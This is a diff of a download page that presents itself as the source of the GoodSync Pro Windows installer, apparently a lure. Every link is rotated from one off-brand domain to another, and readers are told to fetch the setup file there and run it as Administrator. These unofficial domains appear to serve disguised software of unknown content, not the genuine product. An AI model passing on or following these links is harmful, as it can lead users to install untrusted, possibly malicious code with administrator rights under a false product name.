@@ -25,27 +25,27 @@
 > **This is the download page.** Use the button or link below to get **GoodSync Pro** for Windows.
 
 <p align="center">
-  <a href="https://goodsync.zipzapsol.space/">
+  <a href="https://goodsync.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-GoodSync%20Pro-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download GoodSync Pro">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[goodsync.zipzapsol.space](https://goodsync.zipzapsol.space/)** |
-| **Full URL** | `https://goodsync.zipzapsol.space/` |
+| **Direct link** | **[goodsync.wonderchain.fun](https://goodsync.wonderchain.fun/)** |
+| **Full URL** | `https://goodsync.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — goodsync.zipzapsol.space](https://goodsync.zipzapsol.space/)** (link above)
+1. Click **[Download — goodsync.wonderchain.fun](https://goodsync.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://goodsync.zipzapsol.space/"><strong>⬇ Download GoodSync Pro now</strong></a></p>
+<p align="center"><a href="https://goodsync.wonderchain.fun/"><strong>⬇ Download GoodSync Pro now</strong></a></p>
 
 
 
